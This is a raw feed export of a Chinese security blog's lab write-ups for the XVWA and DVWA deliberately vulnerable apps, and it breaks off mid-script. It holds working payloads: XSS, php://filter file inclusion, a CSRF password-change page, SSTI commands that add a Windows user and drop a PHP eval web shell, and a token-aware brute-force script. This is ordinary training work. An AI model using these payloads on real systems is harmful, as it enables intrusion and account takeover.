 You&#x27;ve searched for <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(0)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="SSRF-XSPA"><a href="#SSRF-XSPA" class="headerlink" title="SSRF/XSPA"></a>SSRF/XSPA</h1><p>对源码进行查看</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$image</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$remote_content</span> = file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_url&#x27;</span>]);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;../../img/&quot;</span>.rand().<span class="hljs-string">&quot;img1.jpg&quot;</span>;<br>    file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$remote_content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_url&#x27;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-variable">$image</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot; width=\&quot;100\&quot; height=\&quot;100\&quot; /&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$image</span>;<br></code></pre></div></td></tr></table></figure><p>代码的意思是将输入的地址内容存入一个随机名称的jpg中，只要将内容下下来修改后缀即可获取服务器中文件的内容。比如在读取文件中的该界面写入地址<a href="http://192.168.66.133/xvwa/vulnerabilities/ssrf_xspa/1.txt">http://192.168.66.133/xvwa/vulnerabilities/ssrf_xspa/1.txt</a></p><p>将获取的图片下载，这个无法显示的图片在谷歌上居然下不了了，写了个简单的下载程序</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>r=requests.get(<span class="hljs-string">&quot;http://192.168.66.133/xvwa/img/322img1.jpg&quot;</span>)<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Python\\安全\\nr\\one.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>file.write(r.content)<br></code></pre></div></td></tr></table></figure><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><p>url：<a href="http://192.168.66.133/xvwa/vulnerabilities/fi/?file=php://filter/read=convert.base64-encode/resource=index.php">http://192.168.66.133/xvwa/vulnerabilities/fi/?file=php://filter/read=convert.base64-encode/resource=index.php</a></p><p>结果如图：</p><p><img src="https://pic.imgdb.cn/item/60eaca355132923bf8c3e0f9.png"></p><p>解码后即可得到文件内容</p><h1 id="Session-Flaws"><a href="#Session-Flaws" class="headerlink" title="Session Flaws"></a>Session Flaws</h1><p>查看cookie中的内容，且分别查看登陆前和后的区别</p><p>经过查看cookie内容如下</p><p><img src="https://pic.imgdb.cn/item/60eaca405132923bf8c40847.png"></p><p>在无痕浏览中修改PHPSESSID 为该登陆的id，此时再访问其他界面发现已经成为登录后的用户。</p><h1 id="Insecure-Direct-Object-Reference"><a href="#Insecure-Direct-Object-Reference" class="headerlink" title="Insecure Direct Object Reference"></a>Insecure Direct Object Reference</h1><p>查看对应的源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;../../config.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn1</span>)&#123;<br>    <span class="hljs-variable">$sql</span>= <span class="hljs-string">&#x27;select itemid from caffaine LIMIT 5&#x27;</span>;<br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn1</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$stmt</span>-&gt;execute();<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$rows</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch(PDO::FETCH_NUM))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;option value=\&quot;&quot;</span>.<span class="hljs-variable">$rows</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>.<span class="hljs-variable">$rows</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&quot;&lt;/option&gt;&quot;</span>;<br>    &#125;<br>&#125; <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/select&gt;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div align=\&quot;right\&quot;&gt; &lt;button class=\&quot;btn btn-default\&quot; type=\&quot;submit\&quot;&gt;Submit&lt;/button&gt;&lt;/div&gt;&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt; &lt;/form&gt; &lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<br><span class="hljs-variable">$item</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;item&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;item&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select itemcode,itemname,itemdisplay,itemdesc,categ,price from caffaine where itemid = :itemid&quot;</span>;<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn1</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&#x27;:itemid&#x27;</span>,<span class="hljs-variable">$item</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;table&gt;&quot;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$rows</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch(PDO::FETCH_NUM))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Item Code : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;td rowspan=5&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td rowspan=5 valign=\&quot;top\&quot; align=\&quot;justify\&quot;&gt;&lt;b&gt;Description : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">3</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Item Name : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">1</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;img src=&#x27;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">2</span>]).<span class="hljs-string">&quot;&#x27; height=130 weight=20/&gt;&lt;/td&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Category : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">4</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Price : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">5</span>]).<span class="hljs-string">&quot;$&lt;/td&gt;&lt;/tr&gt;&quot;</span>; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td colspan=3&gt;&lt;hr&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>通过源码查看，无法进行注入了，虽然只是显示了前五个但是可以通过修改url地址直接获取后面的内容。url:<a href="http://192.168.66.133/xvwa/vulnerabilities/idor/?item=7#">http://192.168.66.133/xvwa/vulnerabilities/idor/?item=7#</a></p><p>即可获取其他信息</p><h1 id="Missing-Functional-Access-Control"><a href="#Missing-Functional-Access-Control" class="headerlink" title="Missing Functional Access Control"></a>Missing Functional Access Control</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;../../config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn1</span>)&#123;<br>    <span class="hljs-variable">$sql</span>= <span class="hljs-string">&#x27;select itemid from caffaine&#x27;</span>;<br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn1</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$stmt</span>-&gt;execute();<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$rows</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch(PDO::FETCH_NUM))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;option value=\&quot;&quot;</span>.<span class="hljs-variable">$rows</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>.<span class="hljs-variable">$rows</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&quot;&lt;/option&gt;&quot;</span>;<br>    &#125;<br>&#125; <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/select&gt;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div align=&#x27;right&#x27;&gt; &lt;button class=&#x27;btn btn-default&#x27; type=&#x27;submit&#x27; name=&#x27;action&#x27; value=&#x27;view&#x27;&gt;View&lt;/button&gt;&amp;nbsp;&amp;nbsp;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;button class=&#x27;btn btn-default&#x27; type=&#x27;submit&#x27; name=&#x27;action&#x27; value=&#x27;delete&#x27;&gt;Delete&lt;/button&gt;&lt;/div&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt; &lt;/form&gt; &lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<br><span class="hljs-variable">$item</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;item&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;item&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$action</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;view&#x27;</span>)&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select itemcode,itemname,itemdisplay,itemdesc,categ,price from caffaine where itemid = :itemid&quot;</span>;<br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn1</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&#x27;:itemid&#x27;</span>,<span class="hljs-variable">$item</span>);<br>    <span class="hljs-variable">$stmt</span>-&gt;execute();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;table&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$rows</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch(PDO::FETCH_NUM))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Item Code : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;td rowspan=5&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td rowspan=5 valign=\&quot;top\&quot; align=\&quot;justify\&quot;&gt;&lt;b&gt;Description : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">3</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Item Name : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">1</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;img src=&#x27;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">2</span>]).<span class="hljs-string">&quot;&#x27; height=130 weight=20/&gt;&lt;/td&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Category : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">4</span>]).<span class="hljs-string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Price : &lt;/b&gt;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$rows</span>[<span class="hljs-number">5</span>]).<span class="hljs-string">&quot;$&lt;/td&gt;&lt;/tr&gt;&quot;</span>; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td colspan=3&gt;&lt;hr&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;delete&#x27;</span>)&#123;<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;delete from caffaine where itemid=:itemid&quot;</span>;<br>    <span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$conn1</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&#x27;:itemid&#x27;</span>,<span class="hljs-variable">$item</span>);<br>    <span class="hljs-variable">$stmt</span>-&gt;execute();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$stmt</span>-&gt;rowCount())&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Item deleted successfully.&quot;</span>;<br>    &#125; <br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>发现对用户进行了分类但是，在提交时将如下内容</p><p><a href="http://192.168.66.133/xvwa/vulnerabilities/missfunc/?item=3&amp;action=view">http://192.168.66.133/xvwa/vulnerabilities/missfunc/?item=3&amp;action=view</a></p><p>改为</p><p><a href="http://192.168.66.133/xvwa/vulnerabilities/missfunc/?item=3&amp;action=delete">http://192.168.66.133/xvwa/vulnerabilities/missfunc/?item=3&amp;action=delete</a></p><p>同样可以将第三个删除，后端没有经过严格的过滤</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>经过抓包，发现验证信息仅是cookie和密码是否相同，构建对应的html诱使登录用户点击即可修改密码</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>csrf练习<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>      <br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   <br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://192.168.66.133/xvwa/vulnerabilities/csrf/?passwd=aa&amp;confirm=aa&amp;submit=submit&quot;</span>&gt;</span>点我<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>点击之后密码就被修改了</p><p><img src="https://pic.imgdb.cn/item/60eaca525132923bf8c449ff.png"></p><h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><p>此处主要理解选择对应的算法，<a href="https://wiki.owasp.org/index.php/Guide_to_Cryptography">参考资料</a>随意填入内容即可获取对应的加密内容</p><p><img src="https://pic.imgdb.cn/item/60eaca5f5132923bf8c47516.png"></p><h1 id="Redirects-amp-Forwards"><a href="#Redirects-amp-Forwards" class="headerlink" title="Redirects&amp;Forwards"></a>Redirects&amp;Forwards</h1><p>同样此处也是了解为主，相关的<a href="https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">参考资料</a>主要的重点是减少使用重定向和转发，且不要将跳转的url交给用户控制，或者建立对应的url白名单。</p><h1 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title="Server Side Template Injection"></a>Server Side Template Injection</h1><p>此处输入之后返回对应的 hello **(输入内容)，查看对应漏洞的<a href="https://portswigger.net/research/server-side-template-injection">相关信息</a>,初步了解后发现此处也是可以进行反射性xss写入，并且还可能使用命令执行。</p><p>首先是xss写入，尝试&lt;script&gt;alert(0)&lt;/script&gt;后发现直接就弹窗了</p><p><img src="https://pic.imgdb.cn/item/60eaca6a5132923bf8c49d93.png"></p><p>之后参考<a href="https://www.kanzhun.com/jiaocheng/597521.html">XVWA–从SSTI到system提权</a>进行</p><p>参考大佬的流程后，进行相似的操作，首先添加用户</p><figure class="highlight handlebars"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;net user test test /add&quot;</span>)&#125;&#125;</span><br></code></pre></div></td></tr></table></figure><p>尝试后发现添加失败，进入靶机中尝试，发现不满足密码策略，修改密码后尝试</p><figure class="highlight handlebars"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;net user test te202st1ad@ /add&quot;</span>)&#125;&#125;</span><br></code></pre></div></td></tr></table></figure><p>还是失败，尝试其他方法，首先获取路径使用命令chdir 获取结果为:C:\phpStudy\WWW\xvwa\vulnerabilities\ssti,之后在该目录下创建文件，并准备写入</p><p>使用命令type NUL &gt; shell.php，命令执行成功，之后写入内容通过查询发现使用^可以对&lt;&gt;进行转义从而写入。</p><p>使用命令echo ^&lt;?php @eval($_POST[‘cmd’]); ?^&gt; &gt;shell.php 写入<del>也可以不创建文件直接写入时也会创建</del></p><p><img src="https://pic.imgdb.cn/item/60eaca775132923bf8c4ca9d.png"></p><p>之后使用蚁剑进行连接</p><p><img src="https://pic.imgdb.cn/item/60eaca825132923bf8c4f20c.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>相对来说XVWA比较简单，但是覆盖的宽度较广，在练习中需要查看很多没有了解的漏洞信息。还是需要多学习！</p>]]></content>
    
    
    <categories>
      
      <category>信安 靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机</tag>
      
      <tag>漏洞top10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA练习</title>
    <link href="/2021/07/05/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/DVWA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/07/05/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/DVWA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="DVWA靶机练习"><a href="#DVWA靶机练习" class="headerlink" title="DVWA靶机练习"></a>DVWA靶机练习</h1><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>暴力破解</p><p>首先根据提示可以得知应该使用暴力破解，用户先尝试常用的admin,之后使用bp抓包</p><p><img src="https://img-blog.csdnimg.cn/20210705100259939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>之后使用常用字典进行暴力破解</p><p><img src="https://img-blog.csdnimg.cn/20210705100312291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>经过长度判断密码为password</p><p><img src="https://img-blog.csdnimg.cn/20210705101158834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><h2 id="high模式"><a href="#high模式" class="headerlink" title="high模式"></a>high模式</h2><p>由于有token检测，所以需要先访问界面获取token之后进行爆破</p><p>需要编写程序获取内容后进行爆破。程序如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bs4<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b</span>(<span class="hljs-params">path</span>):</span><br>    password=<span class="hljs-built_in">open</span>(path)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> password.readlines():<br>        <span class="hljs-comment"># 设置获取token的请求内容</span><br>        url=<span class="hljs-string">&quot;http://192.168.66.133/dvwa/vulnerabilities/brute/index.php&quot;</span><br>        headers=&#123;<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span> : <span class="hljs-string">&#x27;security=impossible; security=high; PHPSESSID=06jsdi4p6auso911ivb42u2eg4&#x27;</span><br>        &#125;<br><br>        r=requests.get(url=url,headers=headers)<br>        soup=bs4.BeautifulSoup(r.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        token=soup.select(<span class="hljs-string">&quot;input&quot;</span>)<br>        <span class="hljs-comment"># 得到token</span><br>        toke=token[<span class="hljs-number">3</span>][<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-comment"># 设置请求密码的内容</span><br>        url=<span class="hljs-string">&quot;http://192.168.66.133/dvwa/vulnerabilities/brute/index.php&quot;</span><br>        data=&#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span> : <span class="hljs-string">&#x27;admin&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span> : line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>).strip(),<br>            <span class="hljs-string">&#x27;Login&#x27;</span> : <span class="hljs-string">&#x27;Login&#x27;</span>,<br>            <span class="hljs-string">&#x27;user_token&#x27;</span> : toke<br>        &#125;<br>        r=requests.post(url=url,data=data,headers=headers)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;Welcome&#x27;</span> <span 